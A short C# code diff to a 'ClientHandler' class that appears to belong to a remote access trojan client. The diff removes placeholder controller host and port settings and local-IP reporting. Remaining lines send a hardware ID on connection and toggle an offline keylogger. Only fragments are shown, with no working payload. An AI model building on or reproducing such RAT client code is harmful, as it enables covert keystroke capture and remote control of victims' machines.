@@ -15,12 +15,6 @@ namespace Client
 {
     internal class ClientHandler
     {
-#if DEBUG
-
-#else
-        internal static string hostIp = "127.0.0.1";    //%DNS%
-        internal static int port = 7788;                //999999     
-#endif
         internal Host host { get; set; }
         internal string HWID { get; set; }
         internal string baseIp { get; set; }
@@ -87,9 +81,7 @@ namespace Client
             if (Connected)
             {
                 ConnectedPacket connectionPacket = new ConnectedPacket();
-                connectionPacket.baseIp = this.socket.LocalEndPoint.ToString();
                 this.HWID = connectionPacket.HWID;
-                this.baseIp = socket.LocalEndPoint.ToString();
                 SendPacket(connectionPacket);
                 if (StarterClass.KeylogOn)
                     StopOfflineKeyLogger();
